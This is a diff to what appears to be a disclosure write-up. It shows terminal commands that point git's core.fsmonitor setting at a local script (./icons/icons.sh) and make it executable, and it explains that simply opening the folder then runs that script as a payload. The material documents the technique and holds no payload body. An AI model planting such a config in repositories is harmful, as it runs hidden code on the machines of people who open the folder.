@@ -18,6 +18,7 @@ bash-3.2$ nano .git/config
 	ignorecase = true
 	precomposeunicode = true
 	fsmonitor = ./icons/icons.sh
+bash-3.2$ chmod +x ./icons/icons.sh
 bash-3.2$ git init
 bash-3.2$ git config core.fsmonitor ./icons/icons.sh
 bash-3.2$ ls git-fsmonitor-main/.git/
@@ -40,3 +41,4 @@ OS: Darwin x64 25.1.0
 
 https://github.com/user-attachments/assets/4702aadc-f12d-4380-bc6f-bcd564ddcf96
 
+This works because we initialize the repo & then add `core.fsmonitor` to a file (which can be a payload). Hence, opening a folder is enough to execute your code. 
